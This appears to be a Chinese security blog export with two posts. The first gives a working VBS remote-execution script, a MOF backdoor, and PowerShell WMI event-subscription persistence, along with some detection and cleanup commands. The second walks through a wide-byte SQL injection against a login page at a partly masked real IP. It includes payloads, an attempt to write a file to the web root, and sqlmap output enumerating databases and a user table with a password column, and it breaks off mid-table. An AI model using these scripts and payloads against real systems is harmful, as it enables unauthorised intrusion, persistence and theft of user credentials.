<p>启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic SERVICE where name=&quot;tlntsvr&quot; call startservice</div></pre></td></tr></table></figure></p>
<p>计划任务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic job</div></pre></td></tr></table></figure></p>
<p>Powershell<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\SecurityCenter2 -Class AntiVirusProduct</div></pre></td></tr></table></figure></p>
<p>//-Cre 为创建好的登陆凭据<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Invoke-WmiMethod</span> -Class Win32_Process -Name Create -ArgumentList <span class="string">'notepad.exe'</span> -ComputerName <span class="number">192.168</span>.<span class="number">6.2</span> -Credential domain\administrator</div></pre></td></tr></table></figure></p>
<p>WQL<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Win32_ComputerSystem <span class="keyword">WHERE</span> NumberOfLogicalProcessors &lt; <span class="number">2</span>  </div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> __InstanceCreationEvent <span class="keyword">WITHIN</span> <span class="number">15</span> <span class="keyword">WHERE</span> TargetInstance ISA <span class="string">'Win32_LogonSession'</span> <span class="keyword">AND</span> TargetInstance.LogonType = <span class="number">2</span>  </div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Win32_VolumeChangeEvent <span class="keyword">WHERE</span> EventType = <span class="number">2</span></div></pre></td></tr></table></figure></p>
<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3><p>REMOTE COMMAND EXEC</p>
<blockquote>
<p>有时候低权限用户无法初始化wmic命令行程序，但vbs却能访问wmi接口。</p>
</blockquote>
<figure class="highlight vbs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">'VBS</span></div><div class="line"><span class="comment">' remote command exec</span></div><div class="line"><span class="comment">' cscript wmiexec.vbs 192.168.6.2 domain\administrator 123456 "cmd.exe /c net user &gt; c:\11.txt"</span></div><div class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></div><div class="line"><span class="keyword">Dim</span> strComputer</div><div class="line"><span class="keyword">Dim</span> strUser</div><div class="line"><span class="keyword">Dim</span> strPassword</div><div class="line"><span class="keyword">Dim</span> strCommand</div><div class="line"><span class="keyword">Set</span> objArgs = WScript.Arguments</div><div class="line">strComputer = objArgs(<span class="number">0</span>)</div><div class="line">strUser = objArgs(<span class="number">1</span>)</div><div class="line">strPassword = objArgs(<span class="number">2</span>)</div><div class="line">strCommand = objArgs(<span class="number">3</span>)</div><div class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">CreateObject</span>(<span class="string">"WbemScripting.SWbemLocator"</span>).ConnectServer(strComputer,<span class="string">"root/cimv2"</span>,strUser,strPassword)</div><div class="line"><span class="comment">' Create process</span></div><div class="line"><span class="keyword">Set</span> process = objWMIService.<span class="keyword">Get</span>(<span class="string">"Win32_Process"</span>)</div><div class="line">intReturn = process.Create(strCommand)</div><div class="line"><span class="keyword">If</span> intReturn &lt;&gt;<span class="number">0</span> <span class="keyword">then</span></div><div class="line">	WScript.Echo <span class="string">"Return value: "</span> &amp; intReturn</div><div class="line">	WScript.Echo <span class="string">"Access denied (2)"</span> &amp;vbLf &amp; _</div><div class="line">	<span class="string">"Insufficient privilege (3)"</span> &amp;vbLf &amp; _</div><div class="line">	<span class="string">"Unknown failure (8)"</span> &amp;vbLf &amp; _</div><div class="line">	<span class="string">"Path not found (9)"</span> &amp;vbLf &amp; _</div><div class="line">	<span class="string">"Invalid parameter (21)"</span> &amp;vbLf &amp; _</div><div class="line">	<span class="string">"Other (22-4294967295)"</span></div><div class="line"><span class="keyword">Else</span></div><div class="line">	Wscript.Echo <span class="string">"Process created."</span></div><div class="line"><span class="keyword">End</span> <span class="keyword">If</span></div></pre></td></tr></table></figure>
<h3 id="MOF-后门"><a href="#MOF-后门" class="headerlink" title="MOF 后门"></a>MOF 后门</h3><blockquote>
<p>Managed Object Format (MOF)是WMI数据库中类和类实例的原始保存形式</p>
</blockquote>
<p>动态创建 WMI 类</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$StaticClass</span>=New-ObjectManagement.ManagementClass(<span class="string">'root\cimv2'</span>,<span class="literal">$null</span>,<span class="literal">$null</span>)</div><div class="line"><span class="variable">$StaticClass</span>.Name = <span class="string">'Win32_EvilClass'</span></div><div class="line"><span class="variable">$StaticClass</span>.Put()</div><div class="line"><span class="variable">$StaticClass</span>.Properties.Add(<span class="string">'EvilProperty'</span>,<span class="string">"This is not the malware you're looking for"</span>)</div><div class="line"><span class="variable">$StaticClass</span>.Put()</div></pre></td></tr></table></figure>
<p>创建永久事件订阅</p>
<ol>
<li>Event Filters 事件筛选器 -筛选出感兴趣的事件  </li>
<li><p>Event Consumers 事件消费者 -要在事件被触发时执行的操作  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">  __EventConsumer  </div><div class="line">LogFileEventConsumer - 将事件数据写入到指定的日志文件  </div><div class="line">ActiveScriptEventConsumer - 执行嵌入的 VBScript 或 JScript 脚本  </div><div class="line">payloadNTEventLogEventConsumer - 创建一个包含事件数据的事件日志条目  </div><div class="line">SMTPEventConsumer - 发送一封包含事件数据的电子邮件  </div><div class="line">CommandLineEventConsumer - 执行一个命令行程序</div></pre></td></tr></table></figure>
</li>
<li><p>Binding -绑定筛选器到消费者<br> __FilterToConsumerBinding</p>
</li>
</ol>
<p>事件类型  </p>
<p>内部事件<br>内部事件表示的是创建、修改和删除任何 WMI 类，对象或命名空间的事件。常以两个下划线开头。有可能错过事件，所以必须在 WQL 查询语句的 WITHIN 子句中指定事件轮询间隔。<br>__InstanceCreationEvent  </p>
<p>外部事件<br>WMI外部事件较少，事件发生时立刻被触发。<br>ROOT\CIMV2:Win32_OperatingSystem </p>
<blockquote>
<p>使用外部的 Win32_ProcessStartTrace 事件作为创建 LogonUI.exe 的触发器，可在用户登录的时候执行特定脚本或程序。</p>
</blockquote>
<p>test.mof</p>
<p><a href="https://www.codeproject.com/articles/27914/wmi-mof-basics" target="_blank" rel="external">https://www.codeproject.com/articles/27914/wmi-mof-basics</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#PRAGMA NAMESPACE (&quot;\\\\.\\root\\subscription&quot;)</div><div class="line"></div><div class="line">instance of CommandLineEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">    Name = &quot;WMI_Mofbackdoor_Test_CL&quot;;</div><div class="line">    RunInteractively=false;</div><div class="line">    CommandLineTemplate=&quot;calc.exe&quot;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">    Name = &quot;WMI_Mofbackdoor_Test_EF&quot;;</div><div class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</div><div class="line">    Query =&quot;SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa \&quot;Win32_Process\&quot; And Targetinstance.Name = \&quot;notepad.exe\&quot; &quot;;</div><div class="line">    QueryLanguage = &quot;WQL&quot;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">instance of __FilterToConsumerBinding &#123;</div><div class="line">    Filter = $EventFilter;</div><div class="line">    Consumer = $Consumer;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>编译<br>mofcomp.exe –autorecover test.mof  </p>
<p>mofcomp -N //[machinename]/root/subscription test.mof</p>
<p>或者<br>拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹,会自动编译执行</p>
<p>PowerShell</p>
<p>• Get-WmiObject<br>• Get-CimAssociatedInstance<br>• Get-CimClass - Powershell 3.0 CmdLet<br>• Get-CimInstance<br>• Get-CimSession<br>• Set-WmiInstance<br>• Set-CimInstance<br>• Invoke-WmiMethod<br>• Invoke-CimMethod<br>• New-CimInstance<br>• New-CimSession<br>• New-CimSessionOption<br>• Register-CimIndicationEvent<br>• Register-WmiEvent<br>• Remove-CimInstance<br>• Remove-WmiObject<br>• Remove-CimSession  </p>
<p>创建开机启动事件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$filterName</span>=<span class="string">'BotFilter82'</span></div><div class="line"><span class="variable">$consumerName</span>=<span class="string">'BotConsumer23'</span></div><div class="line"><span class="variable">$exePath</span>=<span class="string">'C:\MyProg.exe'</span></div><div class="line"><span class="comment">#创建一个__EventFilter</span></div><div class="line"><span class="variable">$Query</span>=<span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 200 AND TargetInstance.SystemUpTime &lt; 320"</span></div><div class="line"><span class="variable">$WMIEventFilter</span>=<span class="built_in">Set-WmiInstance</span> -Class __EventFilter -NameSpace <span class="string">"root\subscription"</span> -Arguments @&#123;</div><div class="line">Name=<span class="variable">$filterName</span>;</div><div class="line">EventNameSpace=<span class="string">"root\cimv2"</span>;</div><div class="line">QueryLanguage=<span class="string">"WQL"</span>;</div><div class="line">Query=<span class="variable">$Query</span>&#125; -ErrorAction Stop</div><div class="line"><span class="comment">#创建一个CommandLineEventConsumer</span></div><div class="line"><span class="variable">$WMIEventConsumer</span>=<span class="built_in">Set-WmiInstance</span> -Class CommandLineEventConsumer -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;</div><div class="line">Name=<span class="variable">$consumerName</span>;</div><div class="line">ExecutablePath=<span class="variable">$exePath</span>;</div><div class="line">CommandLineTemplate=<span class="variable">$exePath</span>&#125;</div><div class="line"><span class="comment">#用于绑定filter和consumer</span></div><div class="line"><span class="built_in">Set-WmiInstance</span> -Class __FilterToConsumerBinding -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;</div><div class="line"><span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span>;</div><div class="line">Consumer=<span class="variable">$WMIEventConsumer</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><blockquote>
<p>wmi有时候被恶意软件用来修改浏览器主页</p>
</blockquote>
<p>查看过滤器，消费者，绑定</p>
<p>PowerShell<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#List Event Filters</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventFilter</div><div class="line"><span class="comment">#List Event Consumers</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventConsumer</div><div class="line"><span class="comment">#List Event Bindings</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __FilterToConsumerBinding</div></pre></td></tr></table></figure></p>
<p>使用 wmic</p>
<p>wmic /namespace:\root\subscription PATH <strong>EventConsumer get/format:list<br>wmic /namespace:\root\subscription PATH </strong>EventFilter get/format:list<br>wmic /namespace:\root\subscription PATH <strong>FilterToConsumerBinding get/ format:list<br>wmic /namespace:\root\subscription PATH </strong>TimerInstruction get/format:list</p>
<p>清除</p>
<p>Powershell<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventFilter -Filter <span class="string">"Name='filtP1'"</span> | <span class="built_in">Remove-WmiObject</span> -Verbose    </div><div class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\Subscription -Class __EventConsumer</div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class CommandLineEventConsumer -Filter <span class="string">"Name='consP1'"</span> | <span class="built_in">Remove-WmiObject</span> -Verbose    </div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter <span class="string">"__Path LIKE '%BotFilter82%'"</span> | <span class="built_in">Remove-WmiObject</span> -Verbose</div></pre></td></tr></table></figure></p>
<p>使用 wmic</p>
<p>wmic /namespace:\root\subscription PATH <strong>EventConsumer delete<br>wmic /namespace:\root\subscription PATH </strong>EventFilter delete<br>wmic /namespace:\root\subscription PATH <strong>FilterToConsumerBinding delete<br>wmic /namespace:\root\subscription PATH </strong>TimerInstruction delete</p>
<h3 id="WMI-Providers"><a href="#WMI-Providers" class="headerlink" title="WMI Providers"></a>WMI Providers</h3><p><a href="https://www.codeproject.com/articles/5206/a-simple-guide-to-wmi-providers" target="_blank" rel="external">https://www.codeproject.com/articles/5206/a-simple-guide-to-wmi-providers</a></p>
<p>安装提供程序<br>Installutil.exe WMIServiceHost.dll</p>
<p>wmic PATH win32_servicehost</p>
<p>错误处理 </p>
<p>注册dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">regasm %systemdrive%\program files\reference assemblies\microsoft\framework\v3.5\system.management.instrumentation.dll</div></pre></td></tr></table></figure></p>
<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>namespaces, classes, and objects</p>
<p>持久性对象存储在位于 %SystemRoot%\System32\wbem\Repository\ 的 CIM 数据库中，它存储着 WMI 类的实例，类的定义和命名空间的定义。</p>
<blockquote>
<p>Note<br>1，CIM 数据库可存储任意数据<br>2，作为C2通道传输数据<br>3，创建提供程序  </p>
</blockquote>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP宽字节报错注入]]></title>
      <url>/2015/07/04/PHP%E5%AE%BD%E5%AD%97%E8%8A%82%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h4 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h4><p>注入点<br>POST <a href="http://211.137.*.*/logincheck.php" target="_blank" rel="external">http://211.137.*.*/logincheck.php</a><br>PASSWORD=1111&amp;UNAME=admin</p>
<h5 id="TESTING01-发现宽字节注入"><a href="#TESTING01-发现宽字节注入" class="headerlink" title="TESTING01 发现宽字节注入"></a>TESTING01 发现宽字节注入</h5><p><code>PASSWORD=1111&amp;UNAME=1%bf&#39;</code></p>
<p>#1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1縗’’’ at line 1<br>SQL语句: <code>SELECT * from USER where USER_ID=&#39;1縗&#39;&#39; or BYNAME=&#39;1縗&#39;&#39;</code><br>文件: D:/myoa/webroot/logincheck.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Note</div><div class="line">为了阻止SQL注入，php引入了magic_quotes_gpc，当打开时会对单引号，双引号，反斜线和 NULL字符自动转义。但是当数据库是GBK编码，就会导致宽字节注入。</div><div class="line">转义引号\&apos;</div><div class="line">PASSWORD=123456&amp;UNAME=admin%bf\&apos;</div><div class="line"> ---------------------</div><div class="line">|\ ==&gt; %5C            |</div><div class="line">|当 %bf5c会解码成 縗  |</div><div class="line"> ---------------------</div></pre></td></tr></table></figure>
<h5 id="TESTING02-闭合语句"><a href="#TESTING02-闭合语句" class="headerlink" title="TESTING02 闭合语句"></a>TESTING02 闭合语句</h5><p><code>PASSWORD=123456&amp;UNAME=admin%bf%5C&#39;</code></p>
<p>SQL语句: <code>SELECT * from USER where USER_ID=&#39;admin縗&#39;&#39; or BYNAME=&#39;admin縗&#39;&#39;</code></p>
<p>但是系统多加了一个引号’导致语句出错，我们使用#（%23）注释掉后面的语句。</p>
<p><code>PASSWORD=123456&amp;UNAME=admin%bf&#39;%23</code></p>
<p>SQL语句: <code>SELECT * from USER where USER_ID=&#39;admin縗&#39;#&#39; or BYNAME=&#39;admin縗&#39;#&#39;</code></p>
<h5 id="TESTING03-处理插入语句报错"><a href="#TESTING03-处理插入语句报错" class="headerlink" title="TESTING03 处理插入语句报错"></a>TESTING03 处理插入语句报错</h5><p>select登陆查询语句成功执行，未报错，但是登陆日志插入语句报语法错误。</p>
<p>#1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ at line 1<br>SQL语句: <code>insert into SYS_LOG (USER_ID,TIME,IP,TYPE,REMARK) values (&#39;admin縗&#39;#&#39;,&#39;2015-09-04 13:41:11&#39;,&#39;27.211.123.74&#39;,&#39;10&#39;,&#39;USERNAME=admin縗&#39;#&#39;)</code><br>文件: D:/myoa/webroot/logincheck.php</p>
<p>使用注释构造插入语句<br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39;,2,3,4)%23</code></p>
<p>#1136: Column count doesn’t match value count at row 1<br>SQL语句: <code>insert into SYS_LOG (USER_ID,TIME,IP,TYPE,REMARK) values (&#39;admin縗&#39;,2,3,4)#&#39;,&#39;2015-09-04 13:50:55&#39;,&#39;27.211.123.74&#39;,&#39;10&#39;,&#39;USERNAME=admin縗&#39;,2,3,4)#&#39;)</code><br>文件: D:/myoa/webroot/logincheck.php</p>
<p>提示列数不对，插入少了一个字段，添加一个值后无报错。</p>
<p>PAYLOAD<br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39;,2,3,4,5)%23</code></p>
<h4 id="尝试写SHELL"><a href="#尝试写SHELL" class="headerlink" title="尝试写SHELL"></a>尝试写SHELL</h4><p>判断列数<br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39; order by 1%23</code></p>
<p>使用列最大值判断是否出错<br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39; order by 100%23</code></p>
<p>#1054: Unknown column ‘100’ in ‘order clause’<br>SQL语句: <code>SELECT * from USER where USER_ID=&#39;admin縗&#39; order by 100#&#39; or BYNAME=&#39;admin縗&#39; order by 100#&#39;</code><br>文件: D:/myoa/webroot/logincheck.php</p>
<p>不报错字段77，卧槽77啊<br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39; order by 77%23</code><br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39; and 1=2 union all select 123456,admin縗%23</code><br><code>PASSWORD=123456&amp;UNAME=admin%bf&#39; and 1=2 union all select 1,2,3,4,5,6,7,8,9,10,11,...,74,75,76,77 into outfile &quot;D:/myoa/webroot/r1.txt&quot;%23</code><br>返回空白（可能没有写入权限或者目录不可写）</p>
<h4 id="sqlmap添加-自动跑库"><a href="#sqlmap添加-自动跑库" class="headerlink" title="sqlmap添加*自动跑库"></a>sqlmap添加*自动跑库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u <span class="string">"http://211.137.*.*/logincheck.php"</span> --data=<span class="string">"PASSWORD=123456&amp;UNAME=admin%bf'*%23"</span> --tables</div><div class="line"></div><div class="line">web server operating system: Windows</div><div class="line">web application technology: PHP 5.2.10, Apache 2.2.22</div><div class="line">back-end DBMS: MySQL 5.0</div><div class="line">Database: TRAIN</div><div class="line">[5 tables]</div><div class="line">+---------------------------------------+</div><div class="line">| kind                                  |</div><div class="line">| pass                                  |</div><div class="line">| price                                 |</div><div class="line">| station                               |</div><div class="line">| train                                 |</div><div class="line">+---------------------------------------+</div><div class="line"></div><div class="line">Database: TD_OA</div><div class="line">[204 tables]</div><div class="line">+---------------------------------------+</div><div class="line">| user                                  |</div><div class="line"></div><div class="line">Table: user  //登陆用户数据</div><div class="line">[77 columns]</div><div class="line">+------------------+------------------+</div><div class="line">| Column           | Type             |</div><div class="line">+------------------+------------------+</div><div class="line">| ADD_HOME         | varchar(200)     |</div><div class="line">| AUTHORIZE        | int(11)          |</div><div class="line">| AVATAR           | varchar(20)      |</div><div class="line">| BBS_COUNTER      | int(11)          |</div><div class="line">| BBS_SIGNATURE    | text             |</div><div class="line">| BIND_IP          | text             |</div><div class="line">| BIRTHDAY         | date             |</div><div class="line">| BKGROUND         | text             |</div><div class="line">| BP_NO            | varchar(50)      |</div><div class="line">| BYNAME           | varchar(20)      |</div><div class="line">| CALL_SOUND       | char(2)          |</div><div class="line">| CANBROADCAST     | int(11)          |</div><div class="line">| CONCERN_USER     | text             |</div><div class="line">| DEPT_ID          | int(11)          |</div><div class="line">| DEPT_ID_OTHER    | text             |</div><div class="line">| DISABLED         | int(11)          |</div><div class="line">| DUTY_TYPE        | int(11)          |</div><div class="line">| EMAIL            | varchar(50)      |</div><div class="line">| EMAIL_CAPACITY   | int(11)          |</div><div class="line">| FAX_NO_DEPT      | varchar(50)      |</div><div class="line">| FOLDER_CAPACITY  | int(11)          |</div><div class="line">| ICQ_NO           | varchar(50)      |</div><div class="line">| IS_LUNAR         | char(1)          |</div><div class="line">| KEY_SN           | varchar(100)     |</div><div class="line">| LAST_PASS_TIME   | datetime         |</div><div class="line">| LAST_VISIT_IP    | varchar(100)     |</div><div class="line">| LAST_VISIT_TIME  | datetime         |</div><div class="line">| LIMIT_LOGIN      | char(1)          |</div><div class="line">| MENU_EXPAND      | char(2)          |</div><div class="line">| MENU_IMAGE       | varchar(20)      |</div><div class="line">| MENU_TYPE        | char(1)          |</div><div class="line">| MOBIL_NO         | varchar(50)      |</div><div class="line">| MOBIL_NO_HIDDEN  | char(1)          |</div><div class="line">| MOBILE_PS1       | varchar(50)      |</div><div class="line">| MOBILE_PS2       | varchar(50)      |</div><div class="line">| MOBILE_SP        | varchar(50)      |</div><div class="line">| MSN              | varchar(200)     |</div><div class="line">| MY_RSS           | text             |</div><div class="line">| MY_STATUS        | varchar(200)     |</div><div class="line">| MYTABLE_LEFT     | varchar(200)     |</div><div class="line">| MYTABLE_RIGHT    | varchar(200)     |</div><div class="line">| NICK_NAME        | varchar(50)      |</div><div class="line">| NOT_LOGIN        | varchar(20)      |</div><div class="line">| NOT_VIEW_TABLE   | varchar(20)      |</div><div class="line">| NOT_VIEW_USER    | varchar(20)      |</div><div class="line">| OICQ_NO          | varchar(50)      |</div><div class="line">| ON_STATUS        | char(1)          |</div><div class="line">| ONLINE           | int(11)          |</div><div class="line">| PANEL            | char(1)          |</div><div class="line">| PASSWORD         | varchar(50)      